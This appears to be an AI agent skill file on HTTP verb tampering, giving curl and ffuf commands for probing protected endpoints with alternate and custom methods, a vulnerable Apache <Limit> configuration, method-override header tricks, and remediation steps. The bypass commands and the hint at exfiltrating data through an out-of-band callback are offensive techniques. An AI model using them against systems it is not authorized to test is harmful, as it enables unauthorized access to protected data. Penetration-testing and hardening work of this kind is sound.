---
name: verb-tampering
description: Detect and exploit HTTP method and verb tampering to bypass access controls via alternate methods like HEAD OPTIONS TRACE PATCH and custom verbs exploiting framework-specific route matching and authorization gaps.
---

# HTTP Verb Tampering — Access Control Bypass

HTTP verb tampering abuses mismatches between *which methods an application's routes handle* and *which methods its authorization layer actually inspects*. Many access-control implementations only guard `GET` and `POST`, leaving `HEAD`, `OPTIONS`, `PATCH`, `TRACE`, or entirely arbitrary verbs to reach protected handlers unauthenticated.

## When to use this skill

- A protected endpoint returns `403 Forbidden` or a redirect to login for `GET`/`POST`, and you suspect the check is method-scoped middleware rather than a centralized gate.
- You are testing Apache/Nginx/IIS configurations using `<Limit>`, `limit_except`, or path-based rules that enumerate specific verbs.
- The target uses a framework with per-method routing (Rails, Spring, Laravel, Django REST) where unmatched methods fall through to default handlers.
- An API accepts `X-HTTP-Method-Override` or `_method` parameters and you want to smuggle privileged verbs past a front-line WAF or auth filter.
- During a web app assessment or API pentest as part of OWASP WSTG "Testing HTTP Methods" (WSTG-CONF-06) and broken access control checks.

## Methodology

### 1. Enumerate allowed methods

Start by asking the server what it accepts. The `Allow` header on an `OPTIONS` response reveals the route's method surface — compare it against what actually returns data.

```bash
# Discover the advertised method set on the protected endpoint
curl -X OPTIONS -i https://target.com/admin/users

# Baseline: what does an unauthenticated GET look like?
curl -i https://target.com/admin/users

# Probe common alternates individually
for m in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
  echo "=== $m ==="
  curl -s -o /dev/null -w "%{http_code}\n" -X $m https://target.com/admin/users
done
```

Note discrepancies: if `OPTIONS` advertises `GET, POST, HEAD, OPTIONS` but `PUT` still returns something other than `405 Method Not Allowed`, the route may be falling through to a default handler.

### 2. Differential status-code testing (403 vs 200)

The core signal is a **status-code differential**: the same URL, same auth state, different verbs. A `403` on `GET` but `200` on another verb is a confirmed bypass.

```bash
# Compare status codes across verbs on the protected resource
for m in GET POST HEAD PATCH PUT DELETE OPTIONS TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $m https://target.com/admin/users)
  echo "$m -> $code"
done

# If PATCH returns 200 while GET returns 403, fetch the body via PATCH semantics
curl -X PATCH -i https://target.com/admin/users

# Some servers treat an empty-body PATCH as a read; others need a no-op body
curl -X PATCH -H "Content-Type: application/json" -d '{}' -i https://target.com/admin/users
```

Interpretation guide:

| Pattern | Meaning |
|---|---|
| `GET=403`, `HEAD=200` | Auth middleware only checks read-verbs it knows |
| `GET=403`, `PATCH=200` | Route handler runs for any matched method; auth is method-scoped |
| `GET=403`, `FOO=200` | Custom verb hits default route handler — full bypass |
| All verbs `403`/`302` | Authorization is likely centralized; verb tampering alone won't work |

### 3. HEAD authorization bypass

`HEAD` is semantically identical to `GET` minus the response body, but many middleware stacks never check it because developers only think of "reads" as `GET`. Frameworks auto-handle `HEAD` for every `GET` route, so the request executes the full handler chain — including database queries and side-effect-free logic — while auth filters look only for `GET`.

```bash
# Confirm GET is blocked...
curl -i https://target.com/admin/report

# ...then replay as HEAD: same handler runs, headers reveal success via Content-Length
curl -I https://target.com/admin/report

# If Content-Length matches the real report size, the handler executed.
# Exfiltrate data by pairing HEAD with a reflection channel:
curl -I "https://target.com/admin/report?debug=1"
```

If you need the body (HEAD strips it), pivot: use the confirmed bypass verb to trigger an out-of-band callback (DNS/HTTP to your listener), or check whether `GET` succeeds after establishing a session via another flaw.

### 4. Apache `<Limit>` misconfiguration bypass

Apache's `<Limit GET POST>` directive applies access control **only to the listed methods**. Every other verb — including `OPTIONS`, `TRACE`, `PATCH`, and invented ones — sails through untouched. This is one of the most common misconfigurations in legacy `.htaccess` deployments.

```apache
# VULNERABLE: only GET and POST are protected
<Directory /var/www/admin>
    AuthType Basic
    AuthName "Admin"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
    <Limit GET POST>
        Require valid-user
    </Limit>
</Directory>
```

```bash
# Bypass: any unlisted method skips authentication entirely
curl -X OPTIONS -i https://target.com/admin/
curl -X PATCH  -i https://target.com/admin/secret.txt   # may even return file contents
curl -X FOOBAR -i https://target.com/admin/secret.txt   # arbitrary verb

# Correct pattern uses LimitExcept (deny-by-default):
# <LimitExcept GET POST> Require valid-user </LimitExcept>
```

Nginx's equivalent pitfall: `limit_except GET POST { deny all; }` blocks everything *except* GET/POST — which is safe — but hand-written `if ($request_method = GET)` checks leave all other verbs open.

### 5. Method override headers and custom verbs

Many frameworks support method-spoofing so HTML forms can emulate REST verbs. If an auth filter inspects the transport method but the router honors the override header, you can smuggle a privileged verb past the gate.

```bash
# Rails / Laravel / Symfony style override headers
curl -X POST -H "X-HTTP-Method-Override: DELETE" \
     -H "Content-Type: application/json" \
     -d '{"id": 42}' \
     https://target.com/api/users/42

# Laravel also accepts a form parameter override
curl -X POST -d "_method=DELETE&id=42" https://target.com/api/users/42

# Custom/arbitrary verbs: routers with catch-all or default handlers may execute anyway
curl -X FOO    -i https://target.com/api/users/42
curl -X PROPFIND -i https://target.com/api/users/42   # WebDAV-style verbs sometimes enabled

# Java Spring: @RequestMapping without {method=...} matches ALL methods by default.
# A controller annotated @RequestMapping("/admin") runs for GET, POST, PATCH AND FOO alike.
```

Framework route-matching notes:

- **Rails**: routes are strict per-method (`get`, `post`, ...), but `match '/x', via: :all` or missing `via:` constraints widen the surface. Check `config/routes.rb` equivalents by fuzzing verbs.
- **Spring (Java)**: `@RequestMapping` without a `method` attribute matches every HTTP method — including arbitrary ones — unless explicitly restricted.
- **Laravel**: route definitions bind verb-to-controller tightly, but `_method` form-parameter spoofing is enabled by default (`Illuminate\Http\Request::method()` trusts it).
- **Django**: method dispatch happens inside views (`request.method == 'POST'`), so an unguarded else-branch often executes for *any* unrecognized verb.

### 6. Automated method fuzzing with ffuf

Scale the differential test across an endpoint list using ffuf's `-X` flag to substitute arbitrary methods into requests.

```bash
#!/bin/bash
# ffuf_verb_fuzz.sh — fuzz every verb against each protected endpoint
METHODS="GET POST PUT PATCH DELETE HEAD OPTIONS TRACE PROPFIND FOOBAR"
ENDPOINTS="https://target.com/admin https://target.com/api/users"

for ep in $ENDPOINTS; do
  echo "[*] Endpoint: $ep"
  ffuf -u "$ep" -X FUZZ \
       -w <(echo "$METHODS" | tr ' ' '\n') \
       -mc all -fc 405 \
       -t 20 -r 2>&1 | grep -E "FUZZ|Status"
done

# One-liner variant filtering to interesting status codes:
ffuf -u https://target.com/admin/users -X FUZZ \
     -w <(printf "GET\nPOST\nHEAD\nPATCH\nPUT\nDELETE\nOPTIONS\nTRACE\nFOO\n") \
     -mc 200,301,302,403 -t 20
```

Tuning tips:

- Use `-fc 405` to suppress "method not allowed" noise; anything returning `200`/`302` where baseline was `403` is a hit.
- Add `-H "Authorization: Bearer <lowpriv_token>"` to test whether *low-privileged authenticated* users can escalate via verb swap.

### Remediation

1. **Deny by default for every verb** — including `HEAD`, `OPTIONS`, and unknown/custom methods — on all protected routes. Never enumerate allowed methods in an auth check; enumerate denied ones instead (`<LimitExcept>` in Apache, not `<Limit>`).
2. **Centralize authorization** in a single middleware/filter that runs before routing and method dispatch, so no route can be reached through an unhandled path.
3. **Restrict framework route definitions**: always specify explicit methods (`via:` in Rails, `method = ...` in Spring's `@RequestMapping`, explicit HTTP verb in Laravel route files) and disable `_method`/override-header spoofing unless required (`Request::enableHttpMethodParameterOverride(false)`).
4. **Disable unused methods at the web server**: turn off WebDAV verbs (`PROPFIND`, `MKCOL`), restrict `TRACE` (prevents Cross-Site Tracing), and return `405 Method Not Allowed` for anything unmatched rather than falling through to default handlers.
5. **Normalize method override handling**: if `X-HTTP-Method-Override` must exist, validate it *inside* the authorization layer after resolution, not before.
6. **Test continuously**: add automated checks comparing status codes across all verbs for each protected endpoint to your CI/regression suite so regressions surface immediately.
